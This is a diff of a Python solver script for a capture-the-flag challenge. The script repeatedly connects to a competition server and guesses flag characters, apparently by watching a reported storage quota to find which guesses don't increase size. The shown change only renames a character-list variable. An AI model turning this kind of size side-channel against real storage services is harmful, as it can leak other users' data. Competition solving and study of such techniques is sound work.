@@ -16,12 +16,12 @@ match = received.split("Quota:")[1].split("kB")[0]
 print(str(match))
 conn.close()
 
-valid = ['c', 'd', 'f', 'i', 'n', 'p', 't', 'u', 'C', 'F', 'M', 'R', 'T', '0', '1', '3', '4', '{', '_', '}']
+validChars = ['c', 'd', 'f', 'i', 'n', 'p', 't', 'u', 'C', 'F', 'M', 'R', 'T', '0', '1', '3', '4', '{', '_', '}']
 flag = ""
 ARRAY_LENGTH = 20
 
 #we can figure a flag ends in }, so lets start there.
-for char in valid:
+for char in validChars:
 
     """
     for every different 2 char variation if size does not increase the string tested
@@ -32,10 +32,10 @@ for char in valid:
     """
     cnt = 1
 
-    for x in reversed(valid):           
+    for x in reversed(validChars):           
         print(x)
 
-        for y in reversed(valid):   
+        for y in reversed(validChars):   
             print(y+flag)
             conn = remote('filestore.2021.ctfcompetition.com', 1337)
             conn.recv()
